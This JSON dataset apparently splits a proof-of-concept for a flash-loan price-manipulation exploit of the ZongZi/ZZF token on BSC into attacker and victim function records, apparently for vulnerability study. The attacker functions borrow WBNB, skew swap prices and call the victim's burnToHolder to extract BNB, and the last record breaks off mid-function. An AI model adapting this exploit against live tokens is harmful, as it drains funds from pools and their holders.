[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        Helper helper = new Helper();\n        WBNB.transfer(address(helper), _amount1);\n        helper.exploit();\n\n        ZongZi.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(ZongZi);\n        path[1] = address(WBNB);\n\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ZongZi.balanceOf(address(this)), 0, path, address(this), block.timestamp + 86_400\n        );\n        WBNB.transfer(address(BUSDT_WBNB), (_amount1 * 10_026) / 10_000);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", attackTx);\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(ZongZi), \"ZongZi\");\n        vm.label(address(BUSDT_WBNB), \"BUSDT_WBNB\");\n        vm.label(address(WBNB_ZONGZI), \"WBNB_ZONGZI\");\n        vm.label(address(Router), \"Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Exploiter WBNB balance before attack\", WBNB.balanceOf(address(this)), 18);\n\n        uint256 pairWBNBBalance = WBNB.balanceOf(address(WBNB_ZONGZI));\n        uint256 multiplier = uint256(vm.load(attackContract, bytes32(uint256(9))));\n\n        uint256 amount1Out = (pairWBNBBalance * multiplier) / ((pairWBNBBalance * 100) / address(ZongZi).balance);\n\n        BUSDT_WBNB.swap(0, amount1Out, address(this), abi.encode(uint8(1)));\n\n        emit log_named_decimal_uint(\"Exploiter WBNB balance after attack\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount)\n        public\n        override\n        onlyOwner\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "burnToHolder",
    "original_code": "    function burnToHolder(uint256 amount,address _invitation) external {\n        require(amount >= 0, \"TeaFactory: insufficient funds\");\n\n        address sender = _msgSender();\n        if(Invitation[sender] == address(0) && _invitation != address(0) && _invitation != sender){\n            Invitation[sender] = _invitation;\n            InvitationList[_invitation].add(sender);\n        }\n        if (!userList.contains(sender)) {\n            userList.add(sender);\n        }\n        address[] memory path = new address[](2);\n        path[0] = address(_burnToken);\n        path[1] = uniswapRouter.WETH();\n        uint256 deserved = 0;\n        deserved = uniswapRouter.getAmountsOut(amount, path)[path.length - 1];\n        require(payable(address(_burnToken)).balance>=deserved,'not enough balance');\n        _burnToken.zongziToholder(sender, amount, deserved);\n        _BurnTokenToDead(sender,amount);\n        burnFeeRewards(sender,deserved);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "receiveRewards",
    "original_code": "    function receiveRewards(address payable to) external {\n        address addr = msg.sender;\n        uint256 balance = balanceOf(addr);\n        uint256 amount = balance.sub(burnAmount[addr]); //.sub(Rewards[addr]);\n        require(amount > 0 );\n        Rewards[addr] = Rewards[addr].add(amount);\n        historyRewards[addr] = historyRewards[addr].add(amount);\n        to.transfer(amount.mul(10**9));\n        _transfer(addr, address(this), balance);\n        burnAmount[addr]=0;\n        totalReceive = totalReceive.add(amount);\n        emit ReceiveReward(addr, amount, totalReceive);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n",
    "description": ""
  },
  {
    "contract/interface": "IZZF",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Helper",
    "source_type": "attacker_contract",
    "function_name": "exploit",
    "original_code": "    function exploit() external {\n        WBNB.approve(address(Router), type(uint256).max);\n        ZongZi.approve(address(Router), type(uint256).max);\n        uint256 balanceBeforeWBNB = WBNB.balanceOf(address(this));\n\n        makeSwap(1e17, address(WBNB), address(ZongZi));\n        makeSwap(ZongZi.balanceOf(address(this)), address(ZongZi), address(WBNB));\n\n        uint256 amountIn = balanceBeforeWBNB - 1e17;\n        makeSwap(amountIn, address(WBNB), address(ZongZi));\n\n        uint256 amountOut = address(ZongZi).balance - 1e9;\n        address[] memory path = new address[](2);\n        path[0] = address(ZongZi);\n        path[1] = address(WBNB);\n        uint256[] memory amounts = Router.getAmountsIn(amountOut, path);\n\n        ZZF.burnToHolder(amounts[0], msg.sender);\n",
    "description": ""
  }
]